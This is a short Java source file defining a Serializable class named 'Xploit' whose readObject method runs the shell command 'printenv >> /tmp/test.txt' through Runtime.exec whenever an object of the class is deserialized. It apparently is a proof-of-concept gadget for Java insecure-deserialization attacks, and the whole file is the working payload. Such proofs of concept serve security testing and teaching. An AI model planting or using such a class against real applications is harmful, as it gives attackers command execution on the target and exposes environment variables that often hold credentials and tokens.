package org.example;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

class Xploit implements Serializable {
    private static final long serialVersionUID = -6153687744951339296L;


    private void readObject(ObjectInputStream objectInputStream) throws ClassNotFoundException, IOException {
        System.out.println("XPLOIT - inside readObject");
        Runtime.getRuntime().exec(
               "printenv >> /tmp/test.txt"
        );
    }

    private void writeObject(ObjectOutputStream objectOutputStream) throws IOException {
    }
}
